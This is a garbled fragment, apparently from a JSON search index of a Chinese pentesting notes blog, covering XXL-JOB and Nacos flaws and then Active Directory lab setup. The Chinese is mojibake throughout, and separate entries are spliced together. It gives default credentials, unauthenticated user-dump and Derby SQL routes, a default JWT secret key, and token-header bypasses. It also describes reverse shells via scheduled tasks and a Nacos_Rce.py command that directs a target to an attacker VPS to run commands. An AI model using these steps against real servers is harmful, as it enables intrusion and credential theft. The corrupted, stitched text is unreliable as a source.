gRPCæœåŠ¡æœåŠ¡ç«¯ç«¯å£ï¼šé»˜è®¤9849ï¼Œç”¨äºæœåŠ¡é—´çš„æ•°æ®åŒæ­¥å’Œå…¶ä»–æœåŠ¡ç«¯ä¹‹é—´çš„é€šä¿¡ Jraftè¯·æ±‚æœåŠ¡ç«¯ç«¯å£ï¼šé»˜è®¤ä¸º7848ï¼Œç”¨äºå¤„ç†æœåŠ¡ç«¯é—´çš„Raftç›¸å…³è¯·æ±‚ï¼Œæ¯”å¦‚é›†ç¾¤ç®¡ç†ä¸­çš„é€‰ä¸»å’Œæ—¥å¿—å¤åˆ¶ç­‰ ç‰¹å¾ fofaè¯­æ³•ï¼š\napp=\u0026#34;nacos\u0026#34; \u0026amp;\u0026amp; port=\u0026#34;8848\u0026#34; || icon_hash=\u0026#34;13942501\u0026#34;||icon_hash=\u0026#34;1227052603\u0026#34; \u0026amp;\u0026amp; port=\u0026#34;8848\u0026#34; é¡µé¢ç‰¹å¾ï¼š\nå›¾æ ‡ç‰¹å¾ï¼š\nç‰ˆæœ¬ä¿¡æ¯é…ç½®æ–‡ä»¶\n/nacos/v1/console/server/state å¸¸è§æ¼æ´ å¼±å£ä»¤ nacosçš„é»˜è®¤å£ä»¤ä¸ºnacos/nacos\næœªæˆæƒæŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ è·¯å¾„ï¼š\n/nacos/v1/auth/users?pageNo=1\u0026amp;pageSize=9 æˆ– /v1/auth/users?pageNo=1\u0026amp;pageSize=9 æ¥å£æœªé‰´æƒï¼Œå¯¼è‡´å¯ä»¥æŸ¥çœ‹ç”¨æˆ·åå’Œå¯¹åº”çš„å¯†ç hashï¼š\nUser-Agentæƒé™ç»•è¿‡(CVE-2021-29441) nacosåœ¨è¿›è¡Œè®¤è¯æˆæƒæ“ä½œæ—¶ï¼Œä¼šåˆ¤æ–­è¯·æ±‚çš„user-agentæ˜¯å¦ä¸ºâ€Nacos-Serverâ€ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™ä¸è¿›è¡Œä»»ä½•è®¤è¯ã€‚å¼€å‘è€…åŸæ„æ˜¯ç”¨æ¥å¤„ç†ä¸€äº›æœåŠ¡ç«¯å¯¹æœåŠ¡ç«¯çš„è¯·æ±‚\nè¿™ç§æ ¡éªŒæ–¹å¼è¿‡äºç®€å•ï¼Œæ‰€ä»¥éå¸¸å¥½bypassï¼Œåœ¨ç»•è¿‡æƒé™æ ¡éªŒåï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡/nacos/v1/auth/usersæ¥å£æ·»åŠ ç”¨æˆ·ã€åˆ é™¤ç”¨æˆ·ã€é‡ç½®ç”¨æˆ·å¯†ç ï¼Œè¿™é‡Œç›´æ¥å·¥å…·ä¸€æŠŠæ¢­ï¼š\né»˜è®¤jwtå¯†é’¥-æœªæˆæƒè®¿é—® å¼€å¯äº†nacos.core.auth.enabled çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæœªä¿®æ”¹é»˜è®¤nacos.core.auth.default.token.secret.keyçš„å€¼ï¼ˆåœ¨Nacos\u0026lt;=2.2.0ç‰ˆæœ¬ä¸­ï¼Œè¯¥å€¼ä¸ºé»˜è®¤å€¼ï¼‰ï¼Œåˆ™å¯ä»¥é€šè¿‡é»˜è®¤accessTokenå€¼æ¥bypassæ ¡éªŒï¼š\nnacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789 æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨å·¥å…·ç”Ÿæˆjwtï¼š åœ¨ç™»å½•æ—¶éšä¾¿è¾“å…¥è´¦å·å¯†ç å¹¶æŠ“åŒ…ï¼š å¯ä»¥çœ‹è§åŸæœ¬çš„å“åº”æ˜¾ç¤ºæœªçŸ¥ç”¨æˆ·ï¼Œå°†å·¥å…·ç”Ÿæˆçš„jwtç”¨ä¸‹é¢çš„æ ¼å¼åŠ å…¥è¯·æ±‚åŒ…ï¼š\nAuthorization: Bearer \u0026lt;ä½ çš„JWT\u0026gt; å¯ä»¥çœ‹åˆ°å·²ç»ç™»å½•æˆåŠŸäº†ï¼ŒåŒç†æˆ‘ä»¬åœ¨ç™»å½•æ—¶ä¿®æ”¹å¹¶æ”¾åŒ…å³å¯ç»•è¿‡ç™»å½•è¿›å…¥åå°ï¼Œä»¥åŠè®¿é—®å„ä¸ªæ¥å£ï¼š\nDerbyæœªæˆæƒè®¿é—®ï¼ˆCNVD-2020-67618ï¼‰ nacoså¸¦æœ‰ä¸€ä¸ªåµŒå…¥å¼çš„å°å‹æ•°æ®åº“derbyï¼Œé»˜è®¤æ— éœ€è®¤è¯å³å¯è¢«è®¿é—®ï¼Œå¹¶æ‰§è¡Œä»»æ„sqlæŸ¥è¯¢ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²\nè·¯ç”±å¦‚ä¸‹ï¼š\n/nacos/v1/cs/ops/derby?sql=select * from users å½“ç„¶åŒæ ·å¯ä»¥å·¥å…·ä¸€æŠŠæ¢­ï¼š\nNacos Client Yamlååºåˆ—åŒ–æ¼æ´ åœ¨1.4.1ç‰ˆæœ¬ä¸­å­˜åœ¨Nacos Client Yamlååºåˆ—åŒ–æ¼æ´ï¼Œè¯¥æ¼æ´åªå½±å“å•ç‹¬ä½¿ç”¨ nacos-client SDKçš„ç”¨æˆ·ï¼ŒåŸå› åœ¨äºspring cloudã€springbootã€dubboç­‰æ¡†æ¶ä¸­å¹¶éä½¿ç”¨çš„ AbstractConfigChangeListener ç›‘å¬é…ç½®ï¼Œæ‰€ä»¥è¯¥æ¼æ´åªå½±å“äº†ä½¿ç”¨AbstractConfigChangeListenerç›‘å¬é…ç½®çš„å®¢æˆ·ç«¯\nç”±äºåˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼ˆè¯¥æ¼æ´åªå½±å“å•ç‹¬ä½¿ç”¨ nacos-client SDKçš„ç”¨æˆ·ï¼ŒåŸå› åœ¨äºspring cloudã€springbootã€dubboç­‰æ¡†æ¶ä¸­å¹¶éä½¿ç”¨çš„ AbstractConfigChangeListener ç›‘å¬é…ç½®ï¼Œæ‰€ä»¥è¯¥æ¼æ´åªå½±å“äº†ä½¿ç”¨AbstractConfigChangeListenerç›‘å¬é…ç½®çš„å®¢æˆ·ç«¯ï¼‰ï¼Œè¿™é‡Œå°±ä¸è®°å½•åˆ©ç”¨æ–¹å¼äº†ï¼Œå¯ä»¥å‚è€ƒé¶åœºWPï¼šhttps://cloud.tencent.com/developer/article/2395070\nNacos Hessian ååºåˆ—åŒ–æ¼æ´ æ¼æ´é’ˆå¯¹é»˜è®¤7848ç«¯å£çš„JraftæœåŠ¡ï¼Œç”±äº7848ç«¯å£é‡‡ç”¨hessianåè®®ä¼ è¾“æ•°æ®ï¼Œååºåˆ—åŒ–æœªè®¾ç½®ç™½åå•å¯¼è‡´å­˜åœ¨RCEæ¼æ´\nå½±å“ç‰ˆæœ¬ï¼š1.4.0\u0026lt;=Nacos\u0026lt;1.4.6, 2.0.0\u0026lt;Nacos\u0026lt;2.2.3\nNacos 1.xåœ¨å•æœºæ¨¡å¼ä¸‹é»˜è®¤ä¸å¼€æ”¾7848ç«¯å£ï¼Œæ•…è¯¥æƒ…å†µé€šå¸¸ä¸å—æ­¤æ¼æ´å½±å“ï¼Œä½†æ˜¯é›†ç¾¤æ¨¡å¼å—å½±å“ã€‚ç„¶è€Œï¼Œ2.xç‰ˆæœ¬æ— è®ºå•æœºæˆ–é›†ç¾¤æ¨¡å¼å‡é»˜è®¤å¼€æ”¾7848ç«¯å£\nåŒæ ·ä½¿ç”¨å·¥å…·å³å¯å†™å…¥å†…å­˜é©¬è¿›è¡ŒRCE\nNacos RCE æœ‰ä¸¤ä¸ªRCEçš„è·¯ç”±ï¼š\n/nacos/v1/cs/ops/data/removal /nacos/v1/cs/ops/derby ç”¨ç°æˆçš„è„šæœ¬æ‰“å°±è¡Œäº†ï¼š ä¸‹è½½pocï¼šGitHub - FFR66/Nacos_Rce: ç½‘ä¼ nacos_rceæ¼æ´pocï¼Œå¹¶ä¸Šä¼ åˆ°vpsä¸Š\nvpså¯åŠ¨serverè„šæœ¬ï¼š\npython3 server.py å®¢æˆ·ç«¯ç›´æ¥æ‰“ä¸´æ—¶æ–‡ä»¶RCEï¼š\nNacos_Rce.py -t [vpsçš„IP] -p 8888 -u http://xxx.xxx.xxx.xxx:8848 -c whoami å¦‚æœå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œä¼šå›æ˜¾å‘½ä»¤çš„ç»“æœï¼ˆå¦‚æœæ˜¾ç¤ºæœªçŸ¥ç”¨æˆ·æˆ–è€…æœªæ‰¾åˆ°ç”¨æˆ·ï¼Œåˆ™è¡¨ç¤ºnacoså¯ç”¨äº†é‰´æƒéœ€è¦ä¼ªé€ JWTç»•è¿‡ç™»é™†æˆæƒï¼Œåœ¨æ–‡ä»¶Nacos_Rce.pyæ–‡ä»¶ä¸­è®¾ç½®è¯·æ±‚å¤´å³å¯ã€‚åªè¦èƒ½å¤Ÿç»•è¿‡ç™»é™†æˆæƒï¼Œå°±å¯èƒ½èƒ½RCEï¼‰\n",
        "summary": "å†…ç½‘å¸¸è§æœåŠ¡çš„æ¼æ´æ€»ç»“ ç”±äº6s6å¸ˆå‚…åœ¨é¢è¯•æ­å·æŸ60æ—¶è¢«æ‹·æ‰“äº†å¾ˆå¤šå†…ç½‘å¸¸è§æœåŠ¡çš„æ¼æ´ï¼Œæˆ‘è§‰å¾—è¿˜æ˜¯å¾—ä¸Šæ‰‹å®æ“å¹¶æ€»ç»“ä¸€ä¸‹ï¼Œäºæ˜¯æœ‰äº†è¿™ç¯‡ç¬”è®°\nXXL-JOB ä»‹ç» xxl-jobæ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦å¹³å°ï¼Œæœ‰ä¸¤ä¸ªæ ¸å¿ƒæ¨¡å—ï¼š\nè°ƒåº¦ä¸­å¿ƒadminï¼Œé»˜è®¤ç«¯å£8080ï¼Œè´Ÿè´£ç®¡ç†è°ƒåº¦ä¿¡æ¯ç­‰æ“ä½œ æ‰§è¡Œå™¨executorï¼Œé»˜è®¤ç«¯å£9999ï¼Œè´Ÿè´£ä»»åŠ¡æ‰§è¡Œï¼Œæ¥æ”¶è°ƒåº¦ä¸­å¿ƒçš„è¯·æ±‚ ç‰¹å¾ fofaè¯­æ³•ï¼š\nicon_hash=\u0026#34;1691956220\u0026#34; || app=\u0026#34;xxl-job\u0026#34; é¡µé¢ç‰¹å¾ï¼š\nå›¾æ ‡ç‰¹å¾ï¼š\nå¸¸è§æ¼æ´ å¼±å£ä»¤ xxl-jobçš„åˆå§‹åŒ–sqlè¯­å¥è®¾å®šäº†é»˜è®¤å¯†ç admin/123456ï¼Œå¹¶ä¸”ç™»å½•åä¸ä¼šæç¤ºä¿®æ”¹é»˜è®¤å¯†ç \nè¿™æ ·å¯ä»¥ç›´æ¥è¿›å…¥åå°ï¼š åå°è®¡åˆ’ä»»åŠ¡getshell ç™»å½•æˆåŠŸåå¯ä»¥åœ¨ä»»åŠ¡ç®¡ç†å¤„åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼š åœ¨GLUEIDEå¤„ç¼–è¾‘å‘½ä»¤ï¼š\nå†™å…¥åå¼¹shellçš„å‘½ä»¤ï¼š\nç„¶åå›åˆ°ç®¡ç†é¡µé¢é€‰æ‹©æ‰§è¡Œä¸€æ¬¡ï¼š\nå³å¯åå¼¹shellï¼š\nExecutor Restful APIæœªæˆæƒè®¿é—®RCE å‰é¢æåˆ°äº†xxl-jobåˆ†ä¸ºadminå’Œexecutorï¼Œè€Œexecutoré»˜è®¤æ²¡æœ‰é…ç½®è®¤è¯ï¼Œæœªæˆæƒçš„æ”»å‡»è€…å¯ä»¥é€šè¿‡RESTful APIæ‰§è¡Œä»»æ„å‘½ä»¤\né»˜è®¤accessTokenèº«ä»½ç»•è¿‡ ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆç»å…¸çš„æ¼æ´åœºæ™¯ï¼ŒaccessTokenæ˜¯ä¸ºäº†ä¿®å¤XXL-JOB Executor Restful API æœªæˆæƒè®¿é—®å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä¸ºäº†é˜²æ­¢å…¶æœªæˆæƒæ·»åŠ äº†accessTokenæ ¡éªŒï¼Œä½†æ˜¯å¾ˆå¤šäººåœ¨ä½¿ç”¨è¯¥æ¡†æ¶çš„æ—¶å€™å¹¶æœªä¿®æ”¹å…¶é»˜è®¤çš„å€¼xxl.job.accessToken=default_tokenï¼Œæ‰€ä»¥åªéœ€è¦åœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ XXL-JOB-ACCESS-TOKEN: default_token å³å¯ç»•è¿‡èº«ä»½æ ¡éªŒ\napiæœªæˆæƒHessian2ååºåˆ—åŒ– å³xxl-jobçš„/apiè·¯ç”±å¯ä»¥æœªæˆæƒè®¿é—®ï¼Œè€Œè¯¥æ¥å£ä¼šè¿›è¡ŒHessian2ååºåˆ—åŒ–æ“ä½œï¼Œå¯ä»¥åˆ©ç”¨Hessian2ååºåˆ—åŒ–æ¼æ´è¿›è¡ŒRCE\næœªæˆæƒæƒ…å†µçš„APIç•Œé¢å¦‚ä¸‹\nä¸€æŠŠæ¢­å‘½ä»¤æ‰§è¡Œï¼š\nNacos ä»‹ç» Nacosæ˜¯ä¸€ä¸ªæ›´æ˜“äºæ„å»ºäº‘åŸç”Ÿåº”ç”¨çš„åŠ¨æ€æœåŠ¡å‘ç°ã€é…ç½®ç®¡ç†å’ŒæœåŠ¡ç®¡ç†å¹³å°ï¼Œç”±é˜¿é‡Œå·´å·´å¼€æºï¼Œä¸€èˆ¬åœ¨å†…ç½‘ç³»ç»Ÿä¸­æ¯”è¾ƒå¸¸è§\nnacoséƒ¨ç½²éœ€è¦å¼€æ”¾ä»¥ä¸‹ç«¯å£ï¼š\nä¸»ç«¯å£ï¼šé»˜è®¤8848ï¼Œç®¡ç†é¡µé¢çš„ä¸»å…¥å£ gRPCæœåŠ¡å®¢æˆ·ç«¯ç«¯å£ï¼šé»˜è®¤9848ï¼Œç”¨äºå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·gRPCè¿æ¥å’Œè¯·æ±‚ gRPCæœåŠ¡æœåŠ¡ç«¯ç«¯å£ï¼šé»˜è®¤9849ï¼Œç”¨äºæœåŠ¡é—´çš„æ•°æ®åŒæ­¥å’Œå…¶ä»–æœåŠ¡ç«¯ä¹‹é—´çš„é€šä¿¡ Jraftè¯·æ±‚æœåŠ¡ç«¯ç«¯å£ï¼šé»˜è®¤ä¸º7848ï¼Œç”¨äºå¤„ç†æœåŠ¡ç«¯é—´çš„Raftç›¸å…³è¯·æ±‚ï¼Œæ¯”å¦‚é›†ç¾¤ç®¡ç†ä¸­çš„é€‰ä¸»å’Œæ—¥å¿—å¤åˆ¶ç­‰ ç‰¹å¾ fofaè¯­æ³•ï¼š\napp=\u0026#34;nacos\u0026#34; \u0026amp;\u0026amp; port=\u0026#34;8848\u0026#34; || icon_hash=\u0026#34;13942501\u0026#34;||icon_hash=\u0026#34;1227052603\u0026#34; \u0026amp;\u0026amp; port=\u0026#34;8848\u0026#34; é¡µé¢ç‰¹å¾ï¼š\nå›¾æ ‡ç‰¹å¾ï¼š\n"
    }
,
    {
        "title": "å†…ç½‘æ¸—é€åŸºç¡€çŸ¥è¯†",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/",
        "content": "å†…ç½‘æ¸—é€-ADåŸŸåŸºç¡€çŸ¥è¯† ç®€ä»‹ å†…ç½‘ä¹ŸæŒ‡å±€åŸŸç½‘ï¼Œæ˜¯ä¸€ä¸ªå°é—­çš„ç½‘ç»œç©ºé—´\nå†…ç½‘æ¸—é€ï¼ˆintranet exploitationï¼‰æ˜¯å¯¹ç›®æ ‡æœåŠ¡å™¨getshellåï¼Œé€šè¿‡ä¸€ç³»åˆ—æŠ€æœ¯æ‰‹æ®µå¯¹å…¶æ‰€å¤„çš„å†…ç½‘ç¯å¢ƒè¿›è¡Œæ¸—é€ï¼Œæœ€ç»ˆè·å–å†…ç½‘å…¶ä»–ä¸»æœºçš„æƒé™çš„è¿‡ç¨‹ï¼Œè¿™äº›é€šå¸¸æ¶‰åŠä»¥ä¸‹æŠ€æœ¯ï¼š\nå†…ç½‘ä¿¡æ¯æ”¶é›† å†…ç½‘ä»£ç† æƒé™æå‡ æ¨ªå‘ç§»åŠ¨ \u0026hellip;\u0026hellip; åŸºæœ¬æ¦‚å¿µ å·¥ä½œç»„ï¼ˆwork groupï¼‰ åˆ†è¾¨ï¼šåœ¨å‘½ä»¤æç¤ºç¬¦ç•Œé¢æ‰§è¡Œsysteminfoï¼Œå›æ˜¾ç»“æœçš„â€œåŸŸâ€ä¿¡æ¯ä¸ºWORKGROUP\nç®€å•æ¥è¯´ï¼Œå°±æ˜¯å°†ä¸åŒçš„è®¡ç®—æœºæŒ‰ç…§åŠŸèƒ½æˆ–éƒ¨é—¨åˆ†åˆ«ç½®äºä¸åŒçš„ç»„ï¼Œé€‚ç”¨äºç½‘ç»œä¸­è®¡ç®—æœºä¸å¤šã€èµ„äº§è§„æ¨¡è¾ƒå°ã€å¯¹å®‰å…¨ç®¡ç†æ§åˆ¶è¦æ±‚ä¸ä¸¥æ ¼çš„æƒ…å†µï¼Œè¿™æ˜¯ä¸€ç§æ¾æ•£çš„èµ„æºç®¡ç†æ¨¡å¼ï¼Œä»»ä½•äººéƒ½å¯ä»¥åœ¨å±€åŸŸç½‘ä¸­åˆ›å»ºæ–°çš„å·¥ä½œä»»åŠ¡è€Œæ— éœ€ç®¡ç†å‘˜åŒæ„ï¼Œæ¢è¨€ä¹‹ï¼Œå¤„äºåŒä¸€å·¥ä½œç»„ä¸­çš„ä¸»æœºå½¼æ­¤é—´åœ°ä½å¹³ç­‰ï¼Œä¸å­˜åœ¨é¢å¤–å…³è”æˆ–ç®¡ç†å…³ç³»ï¼Œå¯¹äºæ­¤ç±»æƒ…å†µï¼Œåœ¨å†…ç½‘æ¸—é€æ—¶éœ€è¦é€ä¸ªæ¸—é€ä¸æ§åˆ¶\nåœ¨å±€åŸŸç½‘å†…ï¼Œè®¡ç®—æœºé»˜è®¤éƒ½æ˜¯æŒ‰ç…§å·¥ä½œç»„çš„æ–¹å¼è¿›è¡Œèµ„æºç®¡ç†çš„\nä¼˜ç‚¹ï¼š æ–¹ä¾¿ç®¡ç†å’Œç»´æŠ¤ èµ„æºåˆ†é…æ–¹ä¾¿å’Œçµæ´» ç¼ºç‚¹ï¼š ç¼ºä¹é›†ä¸­ç®¡ç†ä¸æ§åˆ¶çš„æœºåˆ¶ æ²¡æœ‰é›†ä¸­çš„ç»Ÿä¸€è´¦æˆ·ç®¡ç† åªé€‚åˆå°è§„æ¨¡ç”¨æˆ·çš„ä½¿ç”¨ åŸŸï¼ˆdomainï¼‰ åˆ†è¾¨ï¼šåœ¨å‘½ä»¤æç¤ºç¬¦ç•Œé¢æ‰§è¡Œsysteminfoï¼Œå›æ˜¾ç»“æœçš„â€œåŸŸâ€ä¿¡æ¯ä¸ºç±»ä¼¼åŸŸåæ ¼å¼ï¼Œç”±â€œ.â€è¿æ¥çš„å­—ç¬¦ä¸²\nå½“ç»„ç»‡ä¸­ç½‘ç»œè§„æ¨¡è¶Šæ¥è¶Šå¤§æ—¶ï¼Œéœ€è¦ç»Ÿä¸€çš„ç®¡ç†å’Œé›†ä¸­çš„èº«ä»½éªŒè¯ï¼Œå¹¶èƒ½ä¸ºç”¨æˆ·æä¾›æ›´åŠ æ–¹ä¾¿åœ°çš„ç½‘ç»œèµ„æºæœç´¢å’Œä½¿ç”¨æ–¹å¼æ—¶ï¼Œå°±éœ€è¦æ”¾å¼ƒå·¥ä½œç»„è€Œä½¿ç”¨åŸŸ\nåŸŸæ˜¯ä¸€ç§æ¯”å·¥ä½œç»„æ›´é«˜çº§çš„çš„è®¡ç®—æœºèµ„æºç®¡ç†æ¨¡å¼ï¼Œåœ¨åŸŸç¯å¢ƒä¸­ï¼Œæ‰€æœ‰ç”¨æˆ·è´¦æˆ·ã€ç”¨æˆ·ç»„ã€è®¡ç®—æœºã€æ‰“å°æœºå’Œå…¶ä»–å®‰å…¨ä¸»ä½“éƒ½åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªåŸŸæ§åˆ¶å™¨çš„ä¸­å¤®æ•°æ®åº“ä¸­æ³¨å†Œï¼›å½“åŸŸç”¨æˆ·æƒ³è®¿é—®åŸŸä¸­çš„èµ„æºæ—¶ï¼Œå¿…é¡»é€šè¿‡åŸŸæ§åˆ¶å™¨é›†ä¸­è¿›è¡Œèº«ä»½éªŒè¯ï¼Œé€šè¿‡èº«ä»½éªŒè¯çš„åŸŸç”¨æˆ·åœ¨åŸŸä¸­çš„èº«ä»½å†³å®šäº†åŸŸç”¨æˆ·å¯¹åŸŸä¸­èµ„æºçš„è®¿é—®æƒé™\nåœ¨åŸŸç¯å¢ƒä¸­ï¼ŒåŸŸç®¡ç†å‘˜ç”¨æˆ·åœ¨åŸŸä¸­å…·æœ‰æœ€é«˜è®¿é—®æƒé™å’Œæœ€é«˜ç®¡ç†æƒé™ï¼Œåœ¨æ¸—é€è¿‡ç¨‹ä¸­ï¼Œè·å–åŸŸç®¡ç†å‘˜ç›¸å…³æƒé™å¾€å¾€å¯ä»¥æ§åˆ¶æ•´ä¸ªåŸŸæ§\nå•åŸŸ\næŒ‡ç½‘ç»œç¯å¢ƒä¸­åªæœ‰ä¸€ä¸ªåŸŸ\nçˆ¶åŸŸå’Œå­åŸŸ\næŸäº›æƒ…å†µä¸‹ï¼Œéœ€è¦åœ¨ä¸€ä¸ªåŸŸä¸­åˆ†å‡ºå¤šä¸ªåŸŸï¼Œè¢«åˆ’åˆ†çš„åŸŸç§°ä¸ºçˆ¶åŸŸï¼Œåˆ’åˆ†å‡ºæ¥çš„åŸŸè¢«ç§°ä¸ºå­åŸŸï¼Œæ¯ä¸ªå­åŸŸéƒ½æ‹¥æœ‰è‡ªå·±çš„å®‰å…¨ç­–ç•¥ï¼Œåœ¨æœ‰ä¿¡ä»»çš„æƒ…å†µä¸‹ï¼Œçˆ¶åŸŸå¯ä»¥è®¿é—®å­åŸŸ\nä»åŸŸåä¸Šçœ‹ï¼Œå­åŸŸæ˜¯åŸŸåä¸­çš„ä¸€ä¸ªæ®µï¼Œç”¨â€œ.â€è¿›è¡ŒåŸŸååˆ†å‰²ï¼Œä¸€ä¸ªâ€œ.â€ä»£è¡¨åŸŸåçš„ä¸€ä¸ªå±‚çº§\nåŸŸæ ‘\nåŸŸæ ‘æ˜¯å¤šä¸ªåŸŸé€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„ä¸€ä¸ªåŸŸé›†åˆ\nåœ¨åŸŸæ ‘ä¸­ï¼Œæ‰€æœ‰çš„åŸŸå…±äº«åŒä¸€è¡¨ç»“æ„å’Œé…ç½®ï¼Œæ‰€æœ‰åŸŸåå½¢æˆä¸€ä¸ªè¿ç»­çš„åå­—ç©ºé—´ï¼Œè¯¥å‘½åç©ºé—´å…·æœ‰è¿ç»­æ€§ï¼ŒåŸŸåå±‚æ¬¡è¶Šæ·±ï¼Œçº§åˆ«è¶Šä½\nåœ¨åŸŸæ ‘ä¸­ï¼ŒåŸŸç®¡ç†å‘˜åªèƒ½ç®¡ç†æœ¬åŸŸï¼Œä¸èƒ½è®¿é—®æˆ–ç®¡ç†å…¶ä»–åŸŸï¼Œå¦‚æœä¸¤ä¸ªåŸŸä¹‹é—´è¦äº’ç›¸è®¿é—®ï¼Œå°±éœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³»ï¼ˆtrust relationï¼‰\nåŸŸæ—\næŒ‡ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ²¡æœ‰å½¢æˆè¿ç»­åå­—ç©ºé—´çš„åŸŸæ ‘é€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„åŸŸæ ‘é›†åˆï¼ŒåŸŸæ—ä¸­æ‰€æœ‰åŸŸæ ‘å…±äº«åŒä¸€ä¸ªè¡¨ç»“æ„ã€é…ç½®å’Œå…¨å±€ç›®å½•\nåŸŸæ§åˆ¶å™¨ åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼ŒDCï¼‰ç®€ç§°åŸŸæ§ï¼Œæ˜¯åŸŸç¯å¢ƒæ ¸å¿ƒçš„æœåŠ¡å™¨è®¡ç®—æœºï¼Œç”¨äºåœ¨åŸŸä¸­å“åº”å®‰å…¨èº«ä»½è®¤è¯è¯·æ±‚ï¼Œè´Ÿè´£å…è®¸æˆ–æ‹’ç»å‘å‡ºè¯·æ±‚çš„ä¸»æœºè®¿é—®åŸŸå†…èµ„æºï¼Œä»¥åŠå¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€å­˜å‚¨ç”¨æˆ·è´¦æˆ·ä¿¡æ¯å¹¶æ‰§è¡ŒåŸŸçš„å®‰å…¨ç­–ç•¥ç­‰ï¼ŒåŸŸæ§åŒ…å«ä¸€ä¸ªæ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œå…¶ä¸­å­˜å‚¨ç€æ•´ä¸ªåŸŸçš„è´¦æˆ·ã€å¯†ç ã€è®¡ç®—æœºç­‰ä¿¡æ¯ï¼Œè€Œå‰é¢æåˆ°çš„èº«ä»½éªŒè¯ä¾¿ä¸»è¦æœ‰ä»¥ä¸‹æ­¥éª¤ï¼š\nè¯¥è®¡ç®—æœºæ˜¯å¦å±äºæœ¬åŸŸ ç™»å½•è´¦å·æ˜¯å¦å­˜åœ¨ å¯†ç æ˜¯å¦æ­£ç¡® ä¸€ä¸ªåŸŸç¯å¢ƒå¯ä»¥æ‹¥æœ‰ä¸€å°æˆ–å¤šå°åŸŸæ§åˆ¶å™¨ï¼Œæ¯å°åŸŸæ§éƒ½å„è‡ªå­˜å‚¨äº†ä¸€ä»½æ‰€åœ¨åŸŸçš„æ´»åŠ¨ç›®å½•ADçš„å¯å†™å‰¯æœ¬ï¼Œå¯¹ADçš„ä¿®æ”¹éƒ½å¯ä»¥ä»æºåŸŸæ§åŒæ­¥å¤åˆ¶åˆ°åŸŸã€åŸŸæ ‘æˆ–åŸŸæ—çš„å…¶ä»–æ§åˆ¶å™¨ä¸Šï¼Œè¿™æ ·å³ä½¿å…¶ä¸­ä¸€å°åŸŸæ§ç˜«ç—ªï¼Œå¦ä¸€å°åŸŸæ§ä¹Ÿå¯ä»¥ç»§ç»­å·¥ä½œï¼Œä¿è¯åŸŸç¯å¢ƒæ­£å¸¸è¿è¡Œ\nä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒDCä¹Ÿä¼šè¢«ä½œä¸ºDNSæœåŠ¡å™¨ä½¿ç”¨\nåŸŸç¯å¢ƒæ­å»º ä¸»æœºå‡†å¤‡ æˆ‘å‡†å¤‡äº†ä¸‰å°ä¸»æœº\nwindows server 2019 datacenter windows 10 pro x64 windows 10 pro x64 é…ç½®åŸŸæ§ é…ç½®é™æ€IP æ‰“å¼€æ§åˆ¶é¢æ¿ä¸­çš„ç½‘ç»œè®¾ç½®ï¼Œå°†IPé…ç½®ä¸ºé™æ€çš„192.168.111.100ï¼š\næ›´æ”¹ä¸»æœºå åœ¨windows server 2019 datacenterï¼Œwin+ræ‰“å¼€sysdm.cplï¼Œæ›´æ”¹ä¸»æœºåä¸ºDC01ï¼Œç„¶åé‡å¯ä¿å­˜è®¾ç½®ï¼Œå¹¶ä»¥administratorè´¦æˆ·ç™»å½•\nè®¾ç½®ç®¡ç†å‘˜å¯†ç  ç»™administratorè®¾ç½®ä¸€ä¸ªå¯†ç ï¼Œå¦åˆ™åœ¨åˆ›å»ºåŸŸçš„æ£€æŸ¥æ—¶è¿‡ä¸å»ï¼Œè¿™é‡Œæˆ‘è®¾ç½®ä¸ºAdmin123456\nå®‰è£…åŸŸæœåŠ¡ åœ¨æœåŠ¡å™¨ç®¡ç†å™¨ä¸­ï¼Œé€‰æ‹©æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½ï¼Œä¸€ç›´ä¸‹ä¸€æ­¥åˆ°æœåŠ¡å™¨è§’è‰²æ­¥éª¤æ—¶å‹¾é€‰ADåŸŸæœåŠ¡ï¼š\nç„¶åä¸€ç›´ä¸‹ä¸€æ­¥åˆ°ç¡®è®¤æ ç›®ï¼Œå‹¾é€‰â€œå¦‚æœéœ€è¦ï¼Œè‡ªåŠ¨é‡å¯ç›®æ ‡æœåŠ¡å™¨â€\nç„¶åç‚¹å‡»å®‰è£…\nå®Œæ¯•åé€‰æ‹©å³ä¸Šè§’æœ‰ä¸€ä¸ªéƒ¨ç½²åé…ç½®çš„å°†æ­¤æœåŠ¡å™¨æå‡ä¸ºåŸŸæ§åˆ¶å™¨ï¼š\nç‚¹å‡»åé€‰æ‹©æ·»åŠ æ–°æ—ï¼Œæ ¹åŸŸåè®¾ç½®ä¸ºyuy0ung.com\nç„¶åä¸‹ä¸€æ­¥é”®å…¥å¯†ç 